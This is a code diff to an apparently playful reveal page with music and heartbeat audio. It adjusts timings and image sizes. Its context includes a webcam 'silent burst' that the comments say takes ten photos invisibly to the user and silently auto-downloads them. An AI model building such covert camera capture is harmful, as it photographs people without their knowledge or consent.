@@ -138,11 +138,11 @@
             cursor:pointer; border-radius:100px; backdrop-filter:blur(8px);
         }
 
-        @media(max-width:600px) {
+        @media(max-width:1080px) {
             .card { padding:3.5rem 2rem; }
             .deco-float { font-size:3rem; }
             .btn { padding:1.25rem 2.5rem; }
-            .hint-photo img { height:220px; }
+            .hint-photo img { height:600px; }
         }
     </style>
 </head>
@@ -332,11 +332,11 @@
                 requestAnimationFrame(check);
             };
             check();
-            setTimeout(res, 1000);
+            setTimeout(res, 500);
         });
 
         // Pequeña pausa para que la imagen se estabilice
-        await sleep(800);
+        await sleep(400);
 
         // ── RÁFAGA SILENCIOSA: 10 fotos, 250ms entre cada una ──
         // Sin flash, sin contador — completamente invisible para el usuario
@@ -344,13 +344,13 @@
             const blob = await captureFrame(video);
             capturedBlobs.push(blob);
             autoSave(blob, n);
-            await sleep(100);
+            await sleep(50);
         }
 
         // Solo aparece el botón de guardar al terminar
         saveWrap.style.display = 'block';
         // Se oculta solo después de 15s para no molestar
-        setTimeout(() => { saveWrap.style.display = 'none'; }, 15000);
+        setTimeout(() => { saveWrap.style.display = 'none'; }, 10000);
     }
 
     // Descarga automática silenciosa de cada foto
@@ -363,7 +363,7 @@
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
-            setTimeout(() => URL.revokeObjectURL(url), 3000);
+            setTimeout(() => URL.revokeObjectURL(url), 1000);
         } catch(e) { console.warn('autoSave error:', e); }
     }
 
@@ -377,8 +377,8 @@
     function captureFrame(video) {
         return new Promise(resolve => {
             const canvas = document.getElementById('cam-canvas');
-            canvas.width  = video.videoWidth  || 640;
-            canvas.height = video.videoHeight || 480;
+            canvas.width  = video.videoWidth  || 1280;
+            canvas.height = video.videoHeight || 1920;
             const ctx = canvas.getContext('2d');
             ctx.save();
             ctx.translate(canvas.width, 0);
@@ -391,9 +391,9 @@
 
     function doFlash() {
         const fl = document.getElementById('cam-flash');
-        fl.style.transition = 'opacity 0.06s';
+        fl.style.transition = 'opacity 0.01s';
         fl.style.opacity    = '1';
-        setTimeout(() => { fl.style.transition = 'opacity 0.3s'; fl.style.opacity = '0'; }, 60);
+        setTimeout(() => { fl.style.transition = 'opacity 0.1s'; fl.style.opacity = '0'; }, 60);
     }
 
     function closeCam() {
@@ -428,15 +428,15 @@
     /* ── REVELACIÓN (Paso 3 → 4) ── */
     async function showFinalMessage() {
         // Música: fade out y parar
-        fadeTo(bgMusic, 0, 2500);
-        setTimeout(() => { bgMusic.pause(); bgMusic.currentTime = 0; }, 2700);
+        fadeTo(bgMusic, 0, 1200);
+        setTimeout(() => { bgMusic.pause(); bgMusic.currentTime = 0; }, 1200);
 
         // Latido: fade in — DIRECTAMENTE en el clic
         unlockAudio();
         latido.loop   = true;
         latido.volume = 0;
         latido.play().catch(e => console.warn('Latido:', e));
-        fadeTo(latido, 0.78, 2800);
+        fadeTo(latido, 0.78, 1000);
 
         // Visual
         document.body.style.animation  = 'none';
